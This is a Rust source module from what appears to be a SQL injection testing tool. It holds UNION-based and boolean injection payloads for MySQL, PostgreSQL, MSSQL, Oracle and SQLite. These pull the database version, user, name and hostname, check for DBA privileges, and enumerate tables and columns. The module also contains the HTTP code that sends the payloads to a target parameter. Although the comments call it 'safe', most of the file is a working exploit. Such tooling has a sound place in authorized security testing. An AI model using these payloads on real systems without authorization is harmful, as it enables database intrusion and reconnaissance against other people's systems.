//! Database Metadata Extraction
//!
//! Safe queries to extract database information without touching user data.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::proof::DatabaseMetadata;
use crate::sqli::DatabaseType;
use reqwest::Method;
use url::Url;

/// Metadata extraction queries by database type
pub struct MetadataQueries;

impl MetadataQueries {
    /// MySQL metadata queries
    pub fn mysql() -> Vec<(&'static str, &'static str)> {
        vec![
            ("version", "' UNION SELECT @@version-- "),
            ("user", "' UNION SELECT user()-- "),
            ("database", "' UNION SELECT database()-- "),
            ("hostname", "' UNION SELECT @@hostname-- "),
        ]
    }

    /// PostgreSQL metadata queries
    pub fn postgresql() -> Vec<(&'static str, &'static str)> {
        vec![
            ("version", "' UNION SELECT version()-- "),
            ("user", "' UNION SELECT current_user-- "),
            ("database", "' UNION SELECT current_database()-- "),
        ]
    }

    /// MSSQL metadata queries
    pub fn mssql() -> Vec<(&'static str, &'static str)> {
        vec![
            ("version", "' UNION SELECT @@version-- "),
            ("user", "' UNION SELECT user_name()-- "),
            ("database", "' UNION SELECT db_name()-- "),
            ("hostname", "' UNION SELECT @@servername-- "),
        ]
    }

    /// Oracle metadata queries
    pub fn oracle() -> Vec<(&'static str, &'static str)> {
        vec![
            ("version", "' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- "),
            ("user", "' UNION SELECT user FROM dual-- "),
            ("database", "' UNION SELECT ora_database_name FROM dual-- "),
            ("hostname", "' UNION SELECT host_name FROM v$instance-- "),
        ]
    }

    /// Get queries for a specific database type
    pub fn for_db(db_type: DatabaseType) -> Vec<(&'static str, &'static str)> {
        match db_type {
            DatabaseType::MySQL => Self::mysql(),
            DatabaseType::PostgreSQL => Self::postgresql(),
            DatabaseType::MSSQL => Self::mssql(),
            DatabaseType::Oracle => Self::oracle(),
            DatabaseType::SQLite => vec![("version", "' UNION SELECT sqlite_version()-- ")],
            DatabaseType::Unknown => Self::mysql(), // Default to MySQL
        }
    }
}

/// Extract database metadata safely
pub async fn extract(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: Option<DatabaseType>,
) -> anyhow::Result<String> {
    let db = db_type.unwrap_or(DatabaseType::Unknown);
    let queries = MetadataQueries::for_db(db);

    let mut metadata = DatabaseMetadata {
        db_type: Some(db),
        ..Default::default()
    };

    for (field, payload) in queries {
        let mut url = base_url.clone();
        url.query_pairs_mut().append_pair(param, payload);

        let req = HttpRequest::new(Method::GET, url);
        let resp = client.execute(req).await?;
        let body = resp.body_text();

        // Try to extract the value from response
        if let Some(value) = extract_value_from_response(&body) {
            match field {
                "version" => metadata.version = Some(value),
                "user" => metadata.current_user = Some(value),
                "database" => metadata.current_database = Some(value),
                "hostname" => metadata.hostname = Some(value),
                _ => {}
            }
        }
    }

    // Check DBA status
    metadata.is_dba = check_dba_status(client, base_url, param, db).await.ok();

    Ok(metadata.to_string())
}

/// Try to extract a value from UNION-based response
fn extract_value_from_response(body: &str) -> Option<String> {
    // Look for common patterns in UNION responses
    // This is a simplified extraction - real implementation would be more sophisticated

    // Look for version patterns
    let version_patterns = [
        r"(\d+\.\d+\.\d+)",                    // Generic version
        r"MySQL\s+(\S+)",                       // MySQL version
        r"PostgreSQL\s+(\S+)",                  // PostgreSQL version
        r"Microsoft SQL Server\s+(\d+)",        // MSSQL version
    ];

    for pattern in version_patterns {
        if let Ok(re) = regex::Regex::new(pattern) {
            if let Some(caps) = re.captures(body) {
                if let Some(m) = caps.get(1) {
                    return Some(m.as_str().to_string());
                }
            }
        }
    }

    // If no pattern matches, look for any new content
    // This is a heuristic and would need refinement
    None
}

/// Check if current user has DBA privileges
async fn check_dba_status(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<bool> {
    let dba_payload = match db_type {
        DatabaseType::MySQL => "' AND (SELECT super_priv FROM mysql.user WHERE user=user() LIMIT 1)='Y'-- ",
        DatabaseType::MSSQL => "' AND IS_SRVROLEMEMBER('sysadmin')=1-- ",
        DatabaseType::PostgreSQL => "' AND (SELECT usesuper FROM pg_user WHERE usename=current_user)=true-- ",
        DatabaseType::Oracle => "' AND (SELECT COUNT(*) FROM dba_role_privs WHERE grantee=user AND granted_role='DBA')>0-- ",
        _ => return Ok(false),
    };

    // Get baseline
    let baseline_req = HttpRequest::new(Method::GET, base_url.clone());
    let baseline_resp = client.execute(baseline_req).await?;

    // Send DBA check
    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, dba_payload);
    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;

    // If response is similar to baseline, likely true (condition passed)
    Ok(resp.body_len > 0 && (resp.body_len as i64 - baseline_resp.body_len as i64).abs() < 100)
}

/// Extract table names (safe enumeration)
pub async fn enumerate_tables(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
    limit: usize,
) -> anyhow::Result<Vec<String>> {
    let payload = match db_type {
        DatabaseType::MySQL => format!(
            "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {}-- ",
            limit
        ),
        DatabaseType::PostgreSQL => format!(
            "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT {}-- ",
            limit
        ),
        DatabaseType::MSSQL => format!(
            "' UNION SELECT TOP {} name FROM sysobjects WHERE xtype='U'-- ",
            limit
        ),
        DatabaseType::Oracle => format!(
            "' UNION SELECT table_name FROM user_tables WHERE ROWNUM<={}-- ",
            limit
        ),
        _ => return Ok(vec![]),
    };

    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, &payload);

    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;
    let body = resp.body_text();

    // Extract table names from response (simplified)
    let tables = extract_names_from_response(&body);

    Ok(tables)
}

/// Extract column names for a table
pub async fn enumerate_columns(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
    table_name: &str,
    limit: usize,
) -> anyhow::Result<Vec<String>> {
    let payload = match db_type {
        DatabaseType::MySQL => format!(
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}-- ",
            table_name, limit
        ),
        DatabaseType::PostgreSQL => format!(
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}-- ",
            table_name, limit
        ),
        DatabaseType::MSSQL => format!(
            "' UNION SELECT TOP {} name FROM syscolumns WHERE id=OBJECT_ID('{}')-- ",
            limit, table_name
        ),
        DatabaseType::Oracle => format!(
            "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='{}' AND ROWNUM<={}-- ",
            table_name.to_uppercase(), limit
        ),
        _ => return Ok(vec![]),
    };

    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, &payload);

    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;
    let body = resp.body_text();

    let columns = extract_names_from_response(&body);

    Ok(columns)
}

/// Extract identifiers from response body
fn extract_names_from_response(body: &str) -> Vec<String> {
    // This is a simplified extraction
    // A real implementation would parse the response structure
    let mut names = Vec::new();

    // Look for common table/column name patterns
    let identifier_pattern = r"\b([a-zA-Z_][a-zA-Z0-9_]*)\b";
    if let Ok(re) = regex::Regex::new(identifier_pattern) {
        for cap in re.captures_iter(body) {
            if let Some(m) = cap.get(1) {
                let name = m.as_str().to_string();
                // Filter out common HTML/noise
                if !is_noise_word(&name) && !names.contains(&name) {
                    names.push(name);
                }
            }
        }
    }

    names.into_iter().take(20).collect()
}

fn is_noise_word(word: &str) -> bool {
    let noise = [
        "html", "head", "body", "div", "span", "class", "style",
        "script", "href", "src", "alt", "title", "type", "value",
        "input", "form", "table", "tr", "td", "th", "select", "option",
    ];
    noise.contains(&word.to_lowercase().as_str())
}

